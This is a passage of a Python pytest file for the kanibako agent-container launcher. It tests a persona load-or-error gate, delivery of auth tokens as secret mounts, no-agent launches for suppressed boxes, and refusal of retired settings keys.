                std, config, proj, explicit_agent="navigator+claude",
            )
        assert err is not None and "cannot be loaded" in err

    def test_bare_agent_returns_none(self, tmp_path):
        from kanibako.commands.start import persona_create_verdict

        std, config, proj = self._ctx(tmp_path, "claude")
        with (
            patch("kanibako.commands.start.load_merged_config"),
            patch("kanibako.settings.config.resolve_agent", return_value="claude"),
            patch(
                "kanibako.commands.start.resolve_target",
                return_value=self._target(),
            ),
        ):
            # A bare agent has no persona gate → None (no error).
            assert persona_create_verdict(std, config, proj) is None


class TestPersonaLoadOrErrorIntegration:
    """`_run_container` integration: the persona load-or-error gate end-to-end."""

    _NODE = "navigator℘claude"

    def _drive_persona(self, m):
        """Resolve the active agent as the persona node ``navigator℘claude``."""
        from kanibako.settings.agent_config import AgentConfig
        from kanibako.plugins.claude.target import ClaudeTarget, _CLAUDE_DESCRIPTOR
        m.resolve_agent.return_value = _sel(self._NODE)
        m.target.name = "claude"
        m.target.descriptor = _CLAUDE_DESCRIPTOR
        # Real descriptors so the launch-snapshot stub builds the endpoint floor
        # and assembly emits ANTHROPIC_BASE_URL for a resolved endpoint.
        m.target.setting_descriptors.return_value = (
            ClaudeTarget().setting_descriptors()
        )
        cfg = AgentConfig()
        cfg.state = {}
        m.agent_cfg = cfg
        m.load_agent_config.return_value = cfg
        return cfg

    def _configured_persona(self, cfg, tmp_path, monkeypatch, *, base_url,
                            token="sk-bearer\n", model=None):
        """Configure the persona the way a user does: in its agent settings.

        ⚑ These used to be set up by laying the legacy B3 host dir and letting the
        pre-flight adopt it.  B3 is retired (D3), so the SAME delivery properties are
        driven from the persona's own keys — the endpoint, the model-map env and the
        bearer-token pointer.  XDG_CONFIG_HOME is still pointed at an empty tree so
        no stray host dir can influence the result.
        """
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        cfg.state["endpoint"] = base_url
        if model is not None:
            cfg.env["ANTHROPIC_DEFAULT_OPUS_MODEL"] = model
        if token is not None:
            tok = tmp_path / "nav-token"
            tok.write_text(token)
            cfg.secret_path["ANTHROPIC_AUTH_TOKEN"] = str(tok)
        return cfg

    # ---- (a) unconfigured EXPLICIT persona → hard error, NO artifacts,
    #          and the box is NEVER materialised (true pre-flight) -----------

    def test_unconfigured_persona_errors_no_artifacts(
        self, start_mocks, tmp_path, monkeypatch, capsys,
    ):
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # no host dir laid
        # DRIVE THE FIRST-USE PATH (round-1 F3 fix): start_mocks defaults the agent
        # config path's ``.exists()`` truthy, which would take the "config already
        # present" branch and never queue a write — making ``m_write`` vacuous.
        # Point the config path at a REAL, ABSENT file so ``agent_cfg_exists`` is
        # False and the generate/write branch (Jei's exact dogfood first-use case)
        # is live: on a LOADABLE persona the config WOULD be written, so
        # ``m_write.assert_not_called()`` genuinely proves the gate short-circuits
        # BEFORE the write (mutation-proven: move the write pre-gate → this reddens).
        absent_cfg = tmp_path / "agents" / "navigator℘claude" / "settings.yaml"
        with start_mocks() as m:
            self._drive_persona(m)
            with (
                patch(
                    "kanibako.commands.start.agent_settings_path",
                    return_value=absent_cfg,
                ),
                patch(
                    "kanibako.commands.start._resolve_box_launch_decisions",
                    return_value=(_SHARED_AUTH, None, None),  # endpoint unresolved
                ),
                patch(
                    "kanibako.commands.start.write_agent_config"
                ) as m_write,
                patch(
                    "kanibako.commands.start.ensure_persona_share_symlinks"
                ) as m_symlink,
                patch(
                    "kanibako.commands.start._seed_box_home"
                ) as m_seed,
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                    explicit_agent="navigator+claude",  # explicit → deferred box
                )
            assert rc == 1
            # First-use branch is LIVE (config path absent) yet NOTHING persona-
            # scoped is created, and NO launch happens.
            assert not absent_cfg.exists()  # fs-level: no settings.yaml written
            m_write.assert_not_called()
            m_symlink.assert_not_called()
            m_seed.assert_not_called()
            m.runtime.run.assert_not_called()  # no KANIBAKO_AGENT stamp / launch
            # TRUE PRE-FLIGHT: the box was resolved paths-only (initialize=False)
            # and NEVER materialised (no initialize=True call) → no box dir.
            inits = [
                c.kwargs.get("initialize")
                for c in m.resolve_any_project.call_args_list
            ]
            assert inits and all(i is not True for i in inits)
            err = capsys.readouterr().err
            assert "cannot be loaded" in err
            assert "navigator+claude" in err

    # ---- (b)+(e) configured persona → launch, endpoint/token wired, suppress TRUE

    def test_configured_persona_launches_wires_env_and_suppresses(
        self, start_mocks, tmp_path, monkeypatch,
    ):
        with start_mocks() as m:
            cfg = self._drive_persona(m)
            self._configured_persona(
                cfg, tmp_path, monkeypatch, base_url="https://nav.example/v1",
                token="sk-nav-bearer\n", model="gemma-big",
            )
            with (
                patch(
                    "kanibako.commands.start._resolve_box_launch_decisions",
                    return_value=(_SHARED_AUTH, "https://nav.example/v1", None),
                ),
                # Nothing on this path writes the agent file back; patch the write
                # so the real dump against the MagicMock agent path cannot leak a
                # CWD entry if the first-use generate branch is taken.
                patch("kanibako.commands.start.write_agent_config"),
                patch("kanibako.commands.start.credsync") as m_credsync,
            ):
                m_credsync.selected_source_root = (
                    m.credsync.selected_source_root
                )
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            from kanibako.settings.settings_categories import SECRET_MOUNT_DIR
            kw = m.runtime.run.call_args.kwargs
            env = kw.get("env") or {}
            # endpoint (BASE_URL, descriptor channel) and the model-map (agent env
            # channel) reach the container ENV; the token is delivered ARM'S-LENGTH.
            assert env.get("ANTHROPIC_BASE_URL") == "https://nav.example/v1"
            assert env.get("ANTHROPIC_DEFAULT_OPUS_MODEL") == "gemma-big"
            # The bearer token is delivered via the SECRET category: a ro MOUNT +
            # in-box export shim — its VALUE is NEVER in the container env nor argv.
            assert "ANTHROPIC_AUTH_TOKEN" not in env
            assert "sk-nav-bearer" not in "".join(str(v) for v in env.values())
            mounts = kw.get("extra_mounts") or []
            assert any(
                getattr(mt, "destination", "")
                == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
                and getattr(mt, "options", "") == "ro"
                for mt in mounts
            )
            assert kw.get("entrypoint") == "sh"  # the export shim wraps the agent
            assert "sk-nav-bearer" not in " ".join(kw.get("cli_args") or [])
            # THE LEAK GUARD: a custom-endpoint persona suppresses the OAuth sync.
            m_credsync.refresh_box_credentials.assert_called()
            assert (
                m_credsync.refresh_box_credentials.call_args.kwargs["suppress_oauth"]
                is True
            )

    # ---- (c) endpoint but no token → hard error ---------------------------

    def test_endpoint_without_token_errors(
        self, start_mocks, tmp_path, monkeypatch, capsys,
    ):
        # The endpoint resolves but NO token pointer does anywhere.
        with start_mocks() as m:
            cfg = self._drive_persona(m)
            self._configured_persona(
                cfg, tmp_path, monkeypatch, base_url="https://nav.example/v1",
                token=None,
            )
            with (
                patch(
                    "kanibako.commands.start._resolve_box_launch_decisions",
                    return_value=(_SHARED_AUTH, "https://nav.example/v1", None),
                ),
                patch("kanibako.commands.start.write_agent_config") as m_write,
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 1
            m.runtime.run.assert_not_called()
            m_write.assert_not_called()
            assert "no usable auth token" in capsys.readouterr().err

    # ---- (d) BARE claude: byte-identical, NO persona gate ------------------

    def test_bare_claude_never_enters_the_persona_gate(self, start_mocks):
        with start_mocks() as m:
            # Default resolve_agent → "claude" (bare; node == harness).
            with patch(
                "kanibako.commands.start._preflight_persona_load"
            ) as m_gate:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            # A bare agent NEVER enters the persona path → no pre-flight at all,
            # no new error surface, byte-identical launch.
            m_gate.assert_not_called()
            m.runtime.run.assert_called_once()

    # ---- (residual ruling) SYSTEM-DEFAULT persona ALSO defers the box --------

    def test_system_default_persona_defers_box(
        self, start_mocks, tmp_path, monkeypatch, capsys,
    ):
        # No explicit --agent, but the SYSTEM DEFAULT is a persona (Director
        # RESIDUAL ruling, 2026-07-03): the box-independent source must ALSO defer
        # box materialisation, so an unloadable system-default persona on a
        # brand-new box leaves NO empty unregistered box dir.
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # no host dir laid
        absent_cfg = tmp_path / "agents" / "navigator℘claude" / "settings.yaml"
        with start_mocks() as m:
            self._drive_persona(m)
            m.read_system_agent.return_value = "navigator+claude"  # system default
            with (
                patch(
                    "kanibako.commands.start.agent_settings_path",
                    return_value=absent_cfg,
                ),
                patch(
                    "kanibako.commands.start._resolve_box_launch_decisions",
                    return_value=(_SHARED_AUTH, None, None),  # endpoint unresolved
                ),
                patch("kanibako.commands.start.write_agent_config") as m_write,
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],  # NO explicit_agent → system default drives it.
                )
            assert rc == 1
            m_write.assert_not_called()
            m.runtime.run.assert_not_called()
            # TRUE PRE-FLIGHT via the system-default source: box never materialised.
            inits = [
                c.kwargs.get("initialize")
                for c in m.resolve_any_project.call_args_list
            ]
            assert inits and all(i is not True for i in inits)
            assert "cannot be loaded" in capsys.readouterr().err

    # ---- (ADD-c) deferred NEW box: proj-derived locals rebind post-materialize -

    def test_deferred_new_box_rebinds_project_toml(
        self, start_mocks, tmp_path, monkeypatch,
    ):
        # A brand-new DEFERRED (persona) box resolves the probe against the
        # placeholder metadata_path (boxes/__unregistered__), then materialises the
        # real one.  The image-override persist + every downstream box-tier
        # read/write MUST use the REAL box settings file, never __unregistered__/
        # (Editor round-1 ADD-c).  Mutation-proven: drop the post-materialize
        # rebind and the write lands in __unregistered__/ → this reddens.
        unreg = tmp_path / "boxes" / "__unregistered__"
        real = tmp_path / "boxes" / "navigator-box"
        real.mkdir(parents=True)
        with start_mocks() as m:
            cfg = self._drive_persona(m)
            self._configured_persona(
                cfg, tmp_path, monkeypatch, base_url="https://nav.example/v1",
                token="sk-nav-bearer\n",
            )

            def _resolve(*a, **kw):
                # Probe (initialize=False) → placeholder; materialise
                # (initialize=True) → the real, named box dir (is_new set here).
                if kw.get("initialize") is True:
                    m.proj.metadata_path = real
                    m.proj.is_new = True
                else:
                    m.proj.metadata_path = unreg
                    m.proj.is_new = False
                return m.proj

            m.resolve_any_project.side_effect = _resolve
            with (
                patch(
                    "kanibako.commands.start._resolve_box_launch_decisions",
                    return_value=(_SHARED_AUTH, "https://nav.example/v1", None),
                ),
                patch("kanibako.commands.start.write_agent_config"),
                patch("kanibako.commands.start.credsync") as m_credsync,
            ):
                m_credsync.selected_source_root = m.credsync.selected_source_root
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override="custom:img",
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], explicit_agent="navigator+claude",
                )
            assert rc == 0
            # The image override persisted (via the ONE shared CREATE-exception
            # gate, B6) to the REAL box settings file, NOT the placeholder —
            # proving project_toml was rebound after materialise.  The REAL gate
            # ran: assert the on-disk write itself.
            from kanibako.settings.config_io import load_doc
            written = load_doc(real / "settings.yaml")
            assert written.get("box", {}).get("image") == "custom:img"
            assert not (unreg / "settings.yaml").exists()


class TestPersonaLoadOrErrorUnmasked:
    """UNMASKED real-path regression for F5/F7 (Director F5+F7 ruling, 2026-07-03).

    These drive a persona START through the REAL resolver + the REAL
    ``_resolve_box_launch_decisions`` (NO ``_resolve_box_launch_decisions`` patch,
    real ``std``/``proj``).  Only the container-execution boundary (runtime / rig /
    image) is stubbed — just enough to REACH the persona gate on a real filesystem.

    EXPLICIT-CREATE (Jei 2026-07-11g): a launch NEVER materialises a NEW box, so the
    launch-time persona load-or-error gate now applies to an EXISTING box (the box
    is pre-created bare here, then launched with the persona).  The BRAND-NEW-box F7
    proof (a nameless probe fed to ``box_channel_addresses``) moved to the create
    path — see ``tests/test_create_recovery.py`` ``TestPersonaCreateLoadOrError``
    (``_name_new_box_probe`` is still load-bearing there).  What these still prove:
    an existing box launched with a persona resolves load-or-error (unloadable →
    clean rc==1, NOT a ValueError/traceback; loadable → past the gate to launch).
    """

    @contextmanager
    def _preamble(self):
        """Stub ONLY the container/rig/image boundary so a real-path
        ``_run_container`` reaches the persona gate; everything from the resolver
        through ``_resolve_box_launch_decisions`` stays REAL."""
        from types import SimpleNamespace

        runtime = MagicMock()
        runtime.is_running.return_value = False
        runtime.container_exists.return_value = False
        runtime.image_exists.return_value = True
        runtime.ensure_image.return_value = None
        rig = SimpleNamespace(kind="prefab", image="test:latest", containerfile=None)
        with (
            patch("kanibako.commands.start.ContainerRuntime", return_value=runtime),
            patch("kanibako.commands.start.resolve_rig", return_value=rig),
            patch("kanibako.commands.start.load_registry", return_value={}),
            patch("kanibako.launch.shells.capture_image_shell"),
            patch("kanibako.runtime.freshness.check_image_freshness"),
        ):
            yield runtime

    @staticmethod
    def _precreate_bare_box(config_file):
        """Materialise + register a BARE box at cwd so a persona launch passes the
        explicit-create gate and reaches the persona load-or-error gate.  (No agent
        seed is needed — the persona gate runs before the home seed; the launch only
        requires the box dir + home + registry membership to exist.)"""
        from kanibako.settings.config import load_config
        from kanibako.settings.paths import load_std_paths, resolve_box_target

        config = load_config(config_file)
        std = load_std_paths(config)
        resolve_box_target(
            std, config, None, initialize=True, register=True, warn=False,
        )

    def test_unloadable_persona_start_errors_real_path(
        self, config_file, tmp_home, credentials_dir, capsys,
    ):
        # cwd is tmp_home/project; pre-create a BARE box there (launch no longer
        # auto-creates).  Nothing configures 'navigator+claude' anywhere → it is
        # unloadable.
        from kanibako.settings.config import load_config
        from kanibako.settings.paths import load_std_paths

        self._precreate_bare_box(config_file)

        with self._preamble():
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], explicit_agent="navigator+claude",
            )
        # The persona ERROR (rc==1), NOT a ValueError/traceback — the named probe
        # let ``box_channel_addresses`` resolve so the gate could verdict.
        assert rc == 1
        err = capsys.readouterr().err
        assert "cannot be loaded" in err
        assert "navigator+claude" in err

        std = load_std_paths(load_config(config_file))
        # An unloadable persona materialises NO persona agent store (the box itself
        # was pre-created bare and legitimately exists).
        assert not (std.agents / "navigator℘claude").exists()

    def test_loadable_persona_start_passes_gate_real_path(
        self, config_file, tmp_home, credentials_dir,
    ):
        # Configure a real, LOADABLE persona through the PUBLIC route the error
        # message names — `kanibako system set agent.<node>.endpoint` + its
        # `secret_path` key — resolved by the REAL cascade.  (It used to be laid as
        # a B3 host dir under XDG_CONFIG_HOME/claude/navigator/; that route is
        # retired, and its companion test above pins that it now buys nothing.)
        from kanibako.settings.config import load_config
        from kanibako.settings.config_interface import set_config_value
        from kanibako.settings.config_keys import ConfigLevel
        from kanibako.settings.paths import load_std_paths

        std = load_std_paths(load_config(config_file))
        token = tmp_home / "nav-token"
        token.write_text("sk-bearer\n")
        for key, val in (
            ("agent.navigator+claude.endpoint", "https://nav.example/v1"),
            ("agent.navigator+claude.secret_path.ANTHROPIC_AUTH_TOKEN", str(token)),
        ):
            set_config_value(
                key, val, config_path=std.settings,
                command_scope=ConfigLevel.system, agents_root=std.agents,
            )

        self._precreate_bare_box(config_file)

        class _PastGate(Exception):
            pass

        # ``ensure_persona_share_symlinks`` is the first artifact step AFTER the
        # gate; raise a sentinel there to observe that a LOADABLE persona got PAST
        # the gate cleanly (no ValueError) — without spinning a real container for
        # the full launch.
        with self._preamble():
            with (
                patch("kanibako.commands.start.write_agent_config"),
                patch(
                    "kanibako.commands.start.ensure_persona_share_symlinks",
                    side_effect=_PastGate,
                ),
            ):
                with pytest.raises(_PastGate):
                    _run_container(
                        project_dir=None, entrypoint=None, image_override=None,
                        new_session=False, safe_mode=False, resume_mode=False,
                        extra_args=[], explicit_agent="navigator+claude",
                    )
        # The loadable persona proceeded to launch on the pre-created box — proving
        # the gate passed and F7's pre-gate crash is gone.
        assert (std.boxes / "project").is_dir()


# ---------------------------------------------------------------------------
# _agent_critical_dests: enumerate AGENT_CRITICAL mountpoints across plugins
# ---------------------------------------------------------------------------

class TestAgentCriticalDests:
    """`_agent_critical_dests` maps every plugin's AGENT_CRITICAL binds to
    (shell_dir-relative-path, kind) pairs for the hygiene reaper."""

    def test_maps_across_plugins_strips_guest_home(self):
        from kanibako.commands.start import _agent_critical_dests
        from kanibako.settings.settings_resolve import GUEST_HOME
        from kanibako.targets.base import (
            Binding,
            BindKind,
            BindScope,
            HostSrcOrigin,
        )

        class _FakeDesc:
            def __init__(self, bindings):
                self.bindings = tuple(bindings)

        class _FakeTarget:
            def __init__(self, desc):
                self._desc = desc

            @property
            def descriptor(self):
                return self._desc

        alpha = _FakeTarget(_FakeDesc([
            Binding(
                key="launcher", origin=HostSrcOrigin.LAUNCHER,
                box_dest=f"{GUEST_HOME}/.local/bin/alpha", kind=BindKind.FILE,
                scope=BindScope.AGENT_CRITICAL,
            ),
            Binding(
                key="share", origin=HostSrcOrigin.INSTALL_DIR,
                box_dest=f"{GUEST_HOME}/.local/share/alpha", kind=BindKind.DIR,
                scope=BindScope.AGENT_CRITICAL,
            ),
            # An AGENT-scope (non-critical) bind must be ignored.
            Binding(
                key="plugins", origin=HostSrcOrigin.LITERAL,
                box_dest=f"{GUEST_HOME}/.alpha/plugins", kind=BindKind.DIR,
                scope=BindScope.AGENT,
            ),
        ]))
        beta = _FakeTarget(_FakeDesc([
            Binding(
                key="launcher", origin=HostSrcOrigin.LAUNCHER,
                box_dest=f"{GUEST_HOME}/.local/bin/beta", kind=BindKind.FILE,
                scope=BindScope.AGENT_CRITICAL,
            ),
        ]))
        # A descriptor-less target (the no-agent shell) must be skipped.
        bare = _FakeTarget(None)

        fake = {
            "alpha": lambda: alpha,
            "beta": lambda: beta,
            "bare": lambda: bare,
        }
        with patch(
            "kanibako.targets.discover_targets", return_value=fake
        ):
            dests = _agent_critical_dests()

        assert (".local/bin/alpha", "file") in dests
        assert (".local/share/alpha", "dir") in dests
        assert (".local/bin/beta", "file") in dests
        # AGENT-scope bind excluded.
        assert (".alpha/plugins", "dir") not in dests
        # No absolute paths leak through.
        assert all(not rel.startswith("/") for rel, _ in dests)

    def test_dedups_identical_pairs(self):
        from kanibako.commands.start import _agent_critical_dests
        from kanibako.settings.settings_resolve import GUEST_HOME
        from kanibako.targets.base import (
            Binding,
            BindKind,
            BindScope,
            HostSrcOrigin,
        )

        def _mk():
            class _D:
                bindings = (
                    Binding(
                        key="launcher", origin=HostSrcOrigin.LAUNCHER,
                        box_dest=f"{GUEST_HOME}/.local/bin/dup",
                        kind=BindKind.FILE, scope=BindScope.AGENT_CRITICAL,
                    ),
                )

            class _T:
                descriptor = _D()

            return _T()

        with patch(
            "kanibako.targets.discover_targets",
            return_value={"a": _mk, "b": _mk},
        ):
            dests = _agent_critical_dests()

        assert dests.count((".local/bin/dup", "file")) == 1


# ---------------------------------------------------------------------------
# D-M6 — a SUPPRESSED box takes the PLAIN-SHELL path (bifrost E-NULL regression)
# ---------------------------------------------------------------------------


class TestSuppressedBoxLaunchesNoAgent:
    """⚑⚑ THE BIFROST E-NULL REGRESSION — a defect the UNIT seam could not catch.

    ``select_agent`` was already correct (``node='' source='suppressed'``); the bug
    was one line LATER, where the selection vocabulary meets the target vocabulary:
    ``resolve_target(harness_of("")) `` sees an EMPTY NAME, and empty means
    *auto-detect* to it (its documented contract for other callers). So a box that
    asked for NO agent launched claude on the real path — binary, commons, KICKOFF
    and CREDENTIALS delivered — while ``selection_level`` was (correctly) ``None``,
    which ALSO collapsed ``meta.box.auth.workset_path`` to the workset auth ROOT.

    These drive the LAUNCH-side wiring, which is the level the escape happened at:
    the unit tests for ``select_agent`` were green throughout.
    """

    def _suppressed(self):
        from kanibako.settings.agent_select import AgentSelection

        return AgentSelection(node="", source="suppressed")

    def _run(self, m):
        m.resolve_agent.return_value = self._suppressed()

        def _forbid_empty(name=None, project_path=None):
            # ⚑ THE DEFECT, precisely: an EMPTY name makes ``resolve_target``
            # AUTO-DETECT (its documented contract for other callers), so a
            # suppressed box gets whatever agent is installed. A resolve for a
            # NAMED target is fine — ``_launch_snapshot_inputs`` legitimately asks
            # about ``"general"`` — so guard on the EMPTINESS, not on the call.
            if not name:
                raise AssertionError(
                    "resolve_target called with an EMPTY name for a SUPPRESSED "
                    "box — it will AUTO-DETECT an agent (bifrost E-NULL defect)",
                )
            raise KeyError(name)

        m.resolve_target.side_effect = _forbid_empty
        with patch("kanibako.targets.resolve_target", side_effect=_forbid_empty):
            return _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )

    def test_a_suppressed_box_launches_without_resolving_any_agent(self, start_mocks):
        with start_mocks() as m:
            assert self._run(m) == 0
            m.runtime.run.assert_called_once()

    def test_a_suppressed_box_carries_no_agent_stamp(self, start_mocks):
        """No ``KANIBAKO_AGENT``: the stamp is what stop / creds-watch read back to
        run a credential writeback, so a bogus one would restart the whole agent
        lifecycle on a box that has no agent (and re-open the MUST-1 collapse on
        the writeback side)."""
        with start_mocks() as m:
            assert self._run(m) == 0
            env = m.runtime.run.call_args.kwargs["env"]
            assert "KANIBAKO_AGENT" not in env

    def test_a_suppressed_box_delivers_no_agent_binary_mounts(self, start_mocks):
        """The plain-shell shape: no target ⇒ no descriptor, no install, so the
        launch never asks the target for binaries or a config."""
        with start_mocks() as m:
            assert self._run(m) == 0
            m.target.detect.assert_not_called()
            m.target.binary_mounts.assert_not_called()
            m.target.generate_agent_config.assert_not_called()

    def test_a_suppressed_box_resolves_the_snapshot_as_general_with_no_level(
        self, start_mocks,
    ):
        """``agent_id`` falls to the ``general`` template slot and NOTHING is
        installed at ``system.agent`` — pinning that the suppression survives all
        the way into the snapshot inputs.

        ⚑ P8: the whole §1A CLI LEVEL must be ``None`` here, not merely its
        selection half. A suppressed box has no agent slot to spell flag keys
        against, so ``build_cli_level`` is given ``active_agent=None`` and drops
        them — the alternative (``agent.general.*``) would fabricate a key the
        closed keyspace does not declare.
        """
        with start_mocks() as m:
            assert self._run(m) == 0
            kwargs = m.resolve_launch_snapshot.call_args.kwargs
            assert kwargs["agent_name"] == "general"
            assert kwargs["cli_level"] is None
            assert kwargs["target"] is None

    def test_an_UNSUPPRESSED_box_still_resolves_its_target(self, start_mocks):
        """The DISCRIMINATOR: the guard must key on the SUPPRESSION, not fire for
        every launch. A normal selection still goes through ``resolve_target``."""
        from kanibako.settings.agent_select import AgentSelection

        with start_mocks() as m:
            m.resolve_agent.return_value = AgentSelection(
                node="claude", source="settings",
            )
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[],
            )
            assert rc == 0
            m.target.detect.assert_called()
            env = m.runtime.run.call_args.kwargs["env"]
            assert env["KANIBAKO_AGENT"] == "claude"


class TestRetiredBehaviorRefusalWiring:
    """``_refuse_retired_behavior`` — the LAUNCH seam for R-41/RQ-2.

    The unit semantics of the refusal itself live in
    ``tests/test_settings/test_settings_assemble.py``; what is proven HERE is the
    WIRING: which files the launch actually hands it, in which order, with which
    level labels.  A refusal that reads the wrong file is a refusal that never
    fires.
    """

    def _proj(self, tmp_path, box_file):
        from types import SimpleNamespace

        from kanibako.settings.paths import BoxMode

        return SimpleNamespace(
            mode=BoxMode.standalone,
            metadata_path=box_file.parent,
            group=None,
        )

    def _call(self, tmp_path, *, box_doc=None, agent_doc=None, system_doc=None):
        from kanibako.commands.start import _refuse_retired_behavior
        from kanibako.settings.config_io import dump_doc

        box_file = tmp_path / "box" / "settings.yaml"
        box_file.parent.mkdir(parents=True, exist_ok=True)
        if box_doc is not None:
            dump_doc(box_file, box_doc)
        agent_file = tmp_path / "agents" / "claude" / "settings.yaml"
        agent_file.parent.mkdir(parents=True, exist_ok=True)
        if agent_doc is not None:
            dump_doc(agent_file, agent_doc)
        system_file = tmp_path / "global" / "settings.yaml"
        system_file.parent.mkdir(parents=True, exist_ok=True)
        if system_doc is not None:
            dump_doc(system_file, system_doc)
        return _refuse_retired_behavior(
            proj=self._proj(tmp_path, box_file),
            agent_id="claude",
            system_settings_path=system_file,
            agent_cfg_path=agent_file,
        )

    def test_a_clean_set_of_files_passes(self, tmp_path):
        self._call(
            tmp_path,
            box_doc={"box": {"image": "img"}},
            agent_doc={"self": {"access": "full"}},
            system_doc={"agent": {"default": {"access": "restricted"}}},
        )

    def test_a_stale_key_in_the_SYSTEM_file_refuses(self, tmp_path):
        from kanibako.settings.settings_resolve import SettingsError

        with pytest.raises(SettingsError) as exc:
            self._call(
                tmp_path, system_doc={"agent": {"default": {"auto_approve": False}}},
            )
        msg = str(exc.value)
        assert "auto_approve" in msg and "access" in msg
        assert "system" in msg

    def test_a_stale_key_in_the_ACTIVE_AGENT_file_refuses(self, tmp_path):
        """⚑ The tier the SELECTION refusal does not read — and the file
        ``agent set <agent> auto_approve=…`` actually wrote to.  Omitting it here
        would leave the commonest stale spelling silent."""
        from kanibako.settings.settings_resolve import SettingsError

        with pytest.raises(SettingsError) as exc:
            self._call(tmp_path, agent_doc={"self": {"auto_approve": True}})
        msg = str(exc.value)
        assert "self.auto_approve" in msg
        assert "kanibako agent set claude access=full" in msg

    def test_a_stale_pref_request_in_the_BOX_file_refuses(self, tmp_path):
        from kanibako.settings.settings_resolve import SettingsError

        with pytest.raises(SettingsError) as exc:
            self._call(
                tmp_path,
                box_doc={"pref": {"agent": {"claude": {"auto_approve": False}}}},
            )
        assert "pref.agent.claude.auto_approve" in str(exc.value)

    def test_outermost_offender_is_reported_first(self, tmp_path):
        """Cascade order, so fixing one then re-running walks outward→inward
        rather than bouncing between files."""
        from kanibako.settings.settings_resolve import SettingsError

        with pytest.raises(SettingsError) as exc:
            self._call(
                tmp_path,
                system_doc={"agent": {"default": {"auto_approve": True}}},
                agent_doc={"self": {"auto_approve": False}},
            )
        assert "the system settings file" in str(exc.value)


class TestPersonaLiveTierWiring:
    """The persona store as a LIVE resolution input (never a persisted one).

    ``_persona_bundle_for`` reads the store ONCE and its values ride
    ``build_launch_snapshot(persona_values=…)`` into every resolve that must see
    them.  What is asserted here is the SEAM — that a value present only in the
    store reaches the resolved launch snapshot, and that the DISPLAY resolves
    the same value the launch does.

    ⚑ The store rung is now the ONLY route these values take.  While the
    verified swap still persisted them, the agent FILE carried the same
    endpoint/model/secret_path on a rung above and would have masked a broken
    tier; nothing does any more, so every assertion here is load-bearing rather
    than a duplicate of the file's own.
    """

    _ENDPOINT = "https://api.navigator.example/v1"
    _NODE = "navigator℘claude"

    def _store(self, tmp_home, *, env=None, model="gemma4", config=None):
        """Lay down $XDG_CONFIG_HOME/personas/navigator/claude/settings.json."""
        import json

        persona_dir = tmp_home / "config" / "personas" / "navigator"
        (persona_dir / "claude").mkdir(parents=True)
        if config is None:
            block = {
                "ANTHROPIC_BASE_URL": self._ENDPOINT,
                "ANTHROPIC_AUTH_TOKEN": "sk-never-read",
            }
            block.update(env or {})
            doc: dict = {"env": block}
            if model:
                doc["model"] = model
            config = json.dumps(doc)
        (persona_dir / "claude" / "settings.json").write_text(config)
        (persona_dir / ".secret_path").write_text("./token\n")
        return persona_dir

    def _target(self):
        from kanibako.plugins.claude.target import ClaudeTarget

        return ClaudeTarget()

    def _proj(self, std):
        """The same MagicMock box the other snapshot tests resolve against."""
        from kanibako.settings.paths import ProjectGroup

        proj = MagicMock()
        proj.group = ProjectGroup(
            name="default", root=std.data, is_default=True,
            local_shared_base=std.data,
        )
        proj.mode = BoxMode.primary
        proj.project_path = std.data
        proj.enable_vault = False
        proj.name = "navigatorbox"
        return proj

    def _resolve(self, std, *, target, persona_values):
        from kanibako.commands.start import _resolve_launch_snapshot

        return _resolve_launch_snapshot(
            std=std,
            proj=self._proj(std),
            agent_name=self._NODE,
            system_settings_path=None,
            agent_cfg_path=None,
            desc=None,
            install=None,
            target=target,
            agent_cfg=None,
            persona_values=persona_values,
            include_base_families=False,
        )

    def _snapshot(self, std, *, target, persona_values):
        snap, _rec = self._resolve(
            std, target=target, persona_values=persona_values,
        )
        return snap

    def _active(self, snapshot):
        """The resolved ``agent.<node>`` subtree, or ``{}``."""
        node = dict.get(snapshot, "agent") or {}
        return dict.get(node, self._NODE) or {}

    # --- the regression pin: env passthrough ---------------------------------

    def test_a_store_env_var_reaches_the_resolved_launch_snapshot(
        self, std, config_file, tmp_home,
    ):
        """A made-up var, in NO settings file, resolves as agent.<node>.env.<VAR>.

        This is the capability the whole build exists for: the store's env block
        is delivered LIVE, without a persist step to carry it.
        """
        from kanibako.commands.start import _persona_values_for

        self._store(tmp_home, env={"SOME_NEW_VAR": "brand-new"})
        target = self._target()
        snap = self._snapshot(
            std, target=target,
            persona_values=_persona_values_for(self._NODE, target),
        )
        env = dict.get(self._active(snap), "env") or {}
        assert dict.get(env, "SOME_NEW_VAR") == "brand-new"

    def test_the_store_secret_path_reaches_the_resolved_launch_snapshot(
        self, std, config_file, tmp_home,
    ):
        from kanibako.commands.start import _persona_values_for

        persona_dir = self._store(tmp_home)
        target = self._target()
        snap = self._snapshot(
            std, target=target,
            persona_values=_persona_values_for(self._NODE, target),
        )
        secrets = dict.get(self._active(snap), "secret_path") or {}
        assert dict.get(secrets, "ANTHROPIC_AUTH_TOKEN") == str(persona_dir / "token")

    def test_the_tier_reaches_DELIVERY_not_just_the_snapshot(
        self, std, config_file, tmp_home,
    ):
        """The reconcile emits the token MOUNT and the env var from the store.

        The snapshot assertions above prove the value resolved; this proves it
        is actually DELIVERED — ``secret_path`` is a MOUNT category and ``env``
